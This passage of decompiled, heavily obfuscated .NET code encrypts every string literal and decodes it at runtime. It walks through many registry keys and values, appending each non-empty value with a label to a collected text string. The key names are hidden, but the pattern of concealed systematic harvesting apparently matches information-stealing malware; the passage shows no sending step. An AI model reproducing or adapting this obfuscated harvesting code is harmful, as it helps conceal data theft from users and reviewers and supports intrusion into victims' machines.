						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0001ăȂ\u031fКԈ،܁ࠀऌ\u0a60୳౼ൿ\u0e73\u0f73ၷᅽቫ፥ᑚᕒᙇᝅᡐ\u1942ᩊ\u1b72ᱣᵉṟὝ⁆⅚≌⌆⑤╗♐❍⡂⥉⩾⭪ⱸⵯ⸷⼺ぐㅶ㉴㌸㑉㕇㙽㝻㡷㥶㩪㭼㰭㵜㹹㽥䁕䄼䈩䌳䑙䕑䙐䝇䡓"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_57e8;
						}
						goto IL_5842;
						IL_57e8:
						num = 478;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("]ţɥ\u036dѬլٺܧࡖॷ੫ସసഺ")), Registry.GetValue(GClass0.smethod_0("\u0001ăȂ\u031fКԈ،܁ࠀऌ\u0a60୳౼ൿ\u0e73\u0f73ၷᅽቫ፥ᑚᕒᙇᝅᡐ\u1942ᩊ\u1b72ᱣᵉṟὝ⁆⅚≌⌆⑤╗♐❍⡂⥉⩾⭪ⱸⵯ⸷⼺ぐㅶ㉴㌸㑉㕇㙽㝻㡷㥶㩪㭼㰭㵜㹹㽥䁕䄼䈩䌳䑙䕑䙐䝇䡓"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5842;
						IL_5842:
						num = 480;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑙᕓᙀᝄᡓ\u1943\u1a55\u1b73ᱽᵄṀὝ⁏⅛∈⍴\u2452╜♈❆⠂⥤⩎⭫ⱻⵯ\u2e68⽺びㅷ㉵㍲㑸㕡㙈㝀㡽㥽㩴㭦㱫㵿㹿㼫䁅䅯䈨䍆䑨䕤䙶䝠䡪䥸"), GClass0.smethod_0("[Ţɲͱѭխ٥ݲ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5875;
						}
						goto IL_58cf;
						IL_5875:
						num = 481;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Eźɸͷѻմ٢ݼ\u082e\u0942੪ଫ\u0c4b൧\u0e69\u0f75ၥᅭችጸᐸᔺ")), Registry.GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑙᕓᙀᝄᡓ\u1943\u1a55\u1b73ᱽᵄṀὝ⁏⅛∈⍴\u2452╜♈❆⠂⥤⩎⭫ⱻⵯ\u2e68⽺びㅷ㉵㍲㑸㕡㙈㝀㡽㥽㩴㭦㱫㵿㹿㼫䁅䅯䈨䍆䑨䕤䙶䝠䡪䥸"), GClass0.smethod_0("[Ţɲͱѭխ٥ݲ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_58cf;
						IL_58cf:
						num = 483;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑙᕓᙀᝄᡓ\u1943\u1a55\u1b73ᱽᵄṀὝ⁏⅛∈⍴\u2452╜♈❆⠂⥤⩎⭫ⱻⵯ\u2e68⽺びㅷ㉵㍲㑸㕡㙈㝀㡽㥽㩴㭦㱫㵿㹿㼫䁅䅯䈨䍆䑨䕤䙶䝠䡪䥸"), GClass0.smethod_0("[Ţɲͱѭխ٥ݲ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5902;
						}
						goto IL_595c;
						IL_5902:
						num = 484;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Eźɸͷѻմ٢ݼ\u082e\u0942੪ଫ\u0c4b൧\u0e69\u0f75ၥᅭችጸᐸᔺ")), Registry.GetValue(GClass0.smethod_0("\u0002Ăȍ\u031eЙԉ؋܀ࠃऍਟ୲౿ൾ\u0e74\u0f72\u1074ᅼቤ፤ᑙᕓᙀᝄᡓ\u1943\u1a55\u1b73ᱽᵄṀὝ⁏⅛∈⍴\u2452╜♈❆⠂⥤⩎⭫ⱻⵯ\u2e68⽺びㅷ㉵㍲㑸㕡㙈㝀㡽㥽㩴㭦㱫㵿㹿㼫䁅䅯䈨䍆䑨䕤䙶䝠䡪䥸"), GClass0.smethod_0("[Ţɲͱѭխ٥ݲ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_595c;
						IL_595c:
						num = 486;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u007fŽɰ\u036dѬվپݳ\u086e\u0962ੲୡ౪൩\u0e61ཡ\u1069ᅣቹ፷ᑌᕄᙕ\u1757\u187eᥬ\u1a78\u1b40ᱜᵉṚἸ⁐ⅷ≸⍱\u2433╅♾❢⡣⥪⩑⭟\u2c5fⵋ⹅⽃あㅔ㈨㍗㑋㕍㙂"), GClass0.smethod_0("Eťɹͽѩի٪\u0746ࡀ\u0948\u0a47\u0b58"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_598f;
						}
						goto IL_59e9;
						IL_598f:
						num = 487;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("sūɿͱѷվ٨\u0739࠵ष\u0a45\u0b7d\u0c75൷\u0e7dས\u1030ᅠቨጭᑏᕣᙯ\u177bᡦᥨ\u1a64᭼ᱨᴸḸἺ")), Registry.GetValue(GClass0.smethod_0("\u007fŽɰ\u036dѬվپݳ\u086e\u0962ੲୡ౪൩\u0e61ཡ\u1069ᅣቹ፷ᑌᕄᙕ\u1757\u187eᥬ\u1a78\u1b40ᱜᵉṚἸ⁐ⅷ≸⍱\u2433╅♾❢⡣⥪⩑⭟\u2c5fⵋ⹅⽃あㅔ㈨㍗㑋㕍㙂"), GClass0.smethod_0("Eťɹͽѩի٪\u0746ࡀ\u0948\u0a47\u0b58"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_59e9;
						IL_59e9:
						num = 489;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱪᵐṇὂ⁑Ⅰ≒⍫⑭╁♏❯⡻⥫⨸⭀ⱷⵧ\u2e67⼳ぐㅰ㉤㍻㑢㕨㙪㝹㡥㥧㩼㬧㱏㵌㹘㼲䀬䄱"), GClass0.smethod_0("EŁȤ\u0348ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5a1c;
						}
						goto IL_5a76;
						IL_5a1c:
						num = 490;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("HŮɸ\u036aзՁٴݦࡠल\u0a53ୱ౻ൺ\u0e61ཀྵ\u106dᅸቦ፦ᑳᔦᙌᝍᠸ\u1938ᨺ")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱪᵐṇὂ⁑Ⅰ≒⍫⑭╁♏❯⡻⥫⨸⭀ⱷⵧ\u2e67⼳ぐㅰ㉤㍻㑢㕨㙪㝹㡥㥧㩼㬧㱏㵌㹘㼲䀬䄱"), GClass0.smethod_0("EŁȤ\u0348ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5a76;
						IL_5a76:
						num = 492;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱪᵐṇὂ⁑Ⅰ≒⍫⑭╁♏❯⡻⥫⨸⭀ⱷⵧ\u2e67⼳ぐㅰ㉤㍻㑢㕨㙪㝹㡥㥧㩼㬧㱏㵌㹘㼲䀬䄰"), GClass0.smethod_0("EŁȤ\u0348ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5aa9;
						}
						goto IL_5b03;
						IL_5aa9:
						num = 493;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱪᵐṇὂ⁑Ⅰ≒⍫⑭╁♏❯⡻⥫⨸⭀ⱷⵧ\u2e67⼳ぐㅰ㉤㍻㑢㕨㙪㝹㡥㥧㩼㬧㱏㵌㹘㼲䀬䄰"), GClass0.smethod_0("EŁȤ\u0348ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5b03;
						IL_5b03:
						num = 495;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4cᱜᵺṨὫ\u206aⅤ≦⍻\u245b╕♌❅⡕⥒⩏"), GClass0.smethod_0("Kūɯ\u0360Ѫշ\u064b\u0745"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5b36;
						}
						goto IL_5b90;
						IL_5b36:
						num = 496;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("LŪɸͻѺմٶݫ࠷य़\u0a7bୠ\u0c76ൠ\u0e7f\u0f75ၻᄮቌ።ᑤᕤᙰᝥᠧᥐ\u1a55ᭊ\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4cᱜᵺṨὫ\u206aⅤ≦⍻\u245b╕♌❅⡕⥒⩏"), GClass0.smethod_0("Kūɯ\u0360Ѫշ\u064b\u0745"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5b90;
						IL_5b90:
						num = 498;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4cᱜᵺṨὫ\u206aⅤ≦⍻\u245b╕♌❅⡕⥒⩏"), GClass0.smethod_0("Kūɯ\u0360Ѫշ\u064b\u0745"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5bc3;
						}
						goto IL_5c1d;
						IL_5bc3:
						num = 499;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("rŐɳͷѳըپݨ࠹ज़ੲ\u0b7a౹ഴใ\u0f73ၿᅴበ፼ᑬᔬᙟᝥᡤᥧ\u1a75᭴ᱪᵳḸἸ›")), Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑸᕰᙡᝣᡲᥠ\u1a74\u1b4cᱜᵺṨὫ\u206aⅤ≦⍻\u245b╕♌❅⡕⥒⩏"), GClass0.smethod_0("Kūɯ\u0360Ѫշ\u064b\u0745"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5c1d;
						IL_5c1d:
						num = 501;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑀᕈᙙ\u175bᡊᥘᩌ᭴ᱳᵮṴὸ\u2064⅃≒⌀\u244f╱♪❹⡩⥿⩽⬸ⱐ\u2d77\u2e78⽱だㅎ㉂㍥㑿㕼㙨㝡㡮㤪㩊㭧㱪㵫㹤㽪䁧䅧䉳"), GClass0.smethod_0("HŇɘ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5c50;
						}
						goto IL_5caa;
						IL_5c50:
						num = 502;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("GŦɢ\u0363ѵբ٫ܭࡏ।੧\u0b64౩൩\u0e62འၶᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑀᕈᙙ\u175bᡊᥘᩌ᭴ᱳᵮṴὸ\u2064⅃≒⌀\u244f╱♪❹⡩⥿⩽⬸ⱐ\u2d77\u2e78⽱だㅎ㉂㍥㑿㕼㙨㝡㡮㤪㩊㭧㱪㵫㹤㽪䁧䅧䉳"), GClass0.smethod_0("HŇɘ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5caa;
						IL_5caa:
						num = 504;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("vųɢͶг"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5cdd;
						}
						goto IL_5d37;
						IL_5cdd:
						num = 505;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Zšɢʹѷեظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("vųɢͶг"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5d37;
						IL_5d37:
						num = 507;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("vųɢͶв"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5d6a;
						}
						goto IL_5dc4;
						IL_5d6a:
						num = 508;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("{ŰɧͱзԸظ\u073a")), Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("vųɢͶв"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5dc4;
						IL_5dc4:
						num = 510;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("vųɢͶе"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5df7;
						}
						goto IL_5e51;
						IL_5df7:
						num = 511;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("{ŰɧͱаԸظ\u073a")), Registry.GetValue(GClass0.smethod_0("`Ŭɣͼѻկ٭ݢࡡ\u0953\u0a41\u0b50\u0c5d൘๒ཐ\u1056ᅒቊፆᑻᕵᙦᝦᡱ\u197d\u1a6b᭑ᱟᵢṯύ⁺Ⅶ≚⍆⑀╈♧❸"), GClass0.smethod_0("vųɢͶе"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5e51;
						IL_5e51:
						num = 513;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱆ᵴṳὧ⁝Ⅰ≥⍿③╕♛❩⡧⥢⩍⭷ⱞⴹ"), GClass0.smethod_0("^Ůɭ\u0360ѻճ٣ݷࡡ१\u0a56୮"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5e84;
						}
						goto IL_5ede;
						IL_5e84:
						num = 514;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gŷɲ\u0378ќգ٤ݸࡣपਗ਼୦౦ൡ\u0e4c\u0f70\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱆ᵴṳὧ⁝Ⅰ≥⍿③╕♛❩⡧⥢⩍⭷ⱞⴹ"), GClass0.smethod_0("^Ůɭ\u0360ѻճ٣ݷࡡ१\u0a56୮"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5ede;
						IL_5ede:
						num = 516;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱆ᵴṳὧ⁝Ⅰ≥⍿③╕♛❩⡧⥢⩍⭷ⱞⴹ"), GClass0.smethod_0("]ūɪ\u0365Ѹվٻݩ\u0873९੪୪\u0c48൧\u0e78"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5f11;
						}
						goto IL_5f6b;
						IL_5f11:
						num = 517;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gŷɲ\u0378ќգ٤ݸࡣपਗ਼୦౦ൡ\u0e4c\u0f70\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱆ᵴṳὧ⁝Ⅰ≥⍿③╕♛❩⡧⥢⩍⭷ⱞⴹ"), GClass0.smethod_0("]ūɪ\u0365Ѹվٻݩ\u0873९੪୪\u0c48൧\u0e78"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5f6b;
						IL_5f6b:
						num = 519;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱆ᵴṳὧ⁝Ⅰ≥⍿③╕♛❩⡧⥢⩍⭷ⱞⴹ"), GClass0.smethod_0("]ūɪ\u0365Ѹվٻݩ\u0873९੪୪\u0c48൧\u0e78"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5f9e;
						}
						goto IL_5ff8;
						IL_5f9e:
						num = 520;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gŷɲ\u0378ќգ٤ݸࡣपਗ਼୦౦ൡ\u0e4c\u0f70\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱆ᵴṳὧ⁝Ⅰ≥⍿③╕♛❩⡧⥢⩍⭷ⱞⴹ"), GClass0.smethod_0("]ūɪ\u0365Ѹվٻݩ\u0873९੪୪\u0c48൧\u0e78"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5ff8;
						IL_5ff8:
						num = 522;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4e᱅ᵵṷὯ⁾⅏≪⍦⑪╔♋❯⡦⥡⩭⭱Ɽ"), GClass0.smethod_0("Ežɦ\u0362Ѵԥيݢ\u086f।"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_602b;
						}
						goto IL_6085;
						IL_602b:
						num = 523;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("AűɫͳѢ\u0530\u064cݯࡡ९\u0a7e୦౨ർ\u0e62ཫဥᄰሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4e᱅ᵵṷὯ⁾⅏≪⍦⑪╔♋❯⡦⥡⩭⭱Ɽ"), GClass0.smethod_0("Ežɦ\u0362Ѵԥيݢ\u086f।"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6085;
						IL_6085:
						num = 525;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4e᱅ᵵṷὯ⁾⅏≪⍦⑪╔♋❯⡦⥡⩭⭱Ɽ"), GClass0.smethod_0("BŪɩ\u0364ѿտٸݨ\u087c८੩୫త\u0d48\u0e67\u0f78"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_60b8;
						}
						goto IL_6112;
						IL_60b8:
						num = 526;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("AűɫͳѢ\u0530\u064cݯࡡ९\u0a7e୦౨ർ\u0e62ཫဥᄰሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4e᱅ᵵṷὯ⁾⅏≪⍦⑪╔♋❯⡦⥡⩭⭱Ɽ"), GClass0.smethod_0("BŪɩ\u0364ѿտٸݨ\u087c८੩୫త\u0d48\u0e67\u0f78"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_6112;
						IL_6112:
						num = 528;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0018Ąȋ\u0314Гԇ\u0605܊ࠉऋਙଈఅ\u0d00ช༈ဎᅺቢ፮ᑓᕝᙎᝎᡙ᥅ᩓ᭩ᱱᵟṗὒ⁄⅝≁⍃⑅╈☊❨⡚⥓⩕⭹ⱡⵢ⸂⽦ぁㅲ㉻㍮㑀㕏㙲㝼㠸㥕㩷㭡㱠㵿㹷㼱䁶䅠䉼䌭䑁䕢䙮䝭䡤䥢䨫䭠䱥䵱乶佩"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_6145;
						}
						goto IL_619f;
						IL_6145:
						num = 529;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Jŵɹ\u033bјո٬ݣ\u087a॰\u0a34୵౽\u0d63ะག\u1067ᅩቨ፧ᑯᔤ᙭ᝦᡴᥱ\u1a6c\u1b38\u1c38ᴺ")), Registry.GetValue(GClass0.smethod_0("\u0018Ąȋ\u0314Гԇ\u0605܊ࠉऋਙଈఅ\u0d00ช༈ဎᅺቢ፮ᑓᕝᙎᝎᡙ᥅ᩓ᭩ᱱᵟṗὒ⁄⅝≁⍃⑅╈☊❨⡚⥓⩕⭹ⱡⵢ⸂⽦ぁㅲ㉻㍮㑀㕏㙲㝼㠸㥕㩷㭡㱠㵿㹷㼱䁶䅠䉼䌭䑁䕢䙮䝭䡤䥢䨫䭠䱥䵱乶佩"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_619f;
						IL_619f:
						num = 531;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑀᕈᙙ\u175bᡊᥘᩌ᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽓ひㅿ㉴㍣㑓㕚㙥㝩㠫㥅㩻㭩㱩㵡㹠㼤䁁䅭䉹"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_61d2;
						}
						goto IL_622c;
						IL_61d2:
						num = 532;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("EŸɪ\u032eтվ٪ݤ\u086e७ਧ\u0b44౪ർ\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("\vĉȄ\u0319Ѡղٲݿ\u087aॶ੦୵\u0c76൵\u0e7d\u0f7dၽᅷቭ፣ᑀᕈᙙ\u175bᡊᥘᩌ᭴ᱢᵊṀ\u1f47⁗⅐≎⍎⑶╽☽❝⡩⥮⩪⭄ⱒⵗ⸵⽓ひㅿ㉴㍣㑓㕚㙥㝩㠫㥅㩻㭩㱩㵡㹠㼤䁁䅭䉹"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_622c;
						IL_622c:
						num = 534;
